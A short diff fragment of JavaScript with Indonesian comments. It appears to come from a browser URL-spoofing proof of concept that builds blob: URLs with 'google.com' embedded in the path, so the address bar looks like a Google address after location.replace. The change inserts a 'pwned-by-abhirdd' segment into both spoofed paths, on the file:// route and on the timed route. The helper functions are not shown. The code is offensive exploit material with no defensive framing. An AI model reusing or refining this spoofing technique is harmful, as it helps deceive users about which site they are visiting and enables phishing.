@@ -50,7 +50,7 @@
       // ---- JALUR file:// : prefix terpendek "blob:null/" + path google.com ----
       if (location.protocol === 'file:' || location.origin === 'null') {
         var uf = makeUrl();
-        var dispf = 'blob:null/google.com/' + uuidOf(uf);
+        var dispf = 'blob:null/google.com/pwned-by-abhirdd/' + uuidOf(uf);
         log('[main] mode file:// -> DIRECT (path spoof)');
         log('[main] target: ' + dispf + FRAG + dispf);
         location.replace(dispf + FRAG + dispf);
@@ -62,7 +62,7 @@
       // terakhir), path antara origin & uuid ARBITRARY -> sisipkan google.com.
       setTimeout(function () {
         var u = makeUrl();
-        var disp = 'blob:' + location.origin + '/google.com/' + uuidOf(u);
+        var disp = 'blob:' + location.origin + '/google.com/pwned-by-abhirdd/' + uuidOf(u);
         log('[main] commit: ' + disp + FRAG + disp);
         location.replace(disp + FRAG + disp);
       }, 1200);
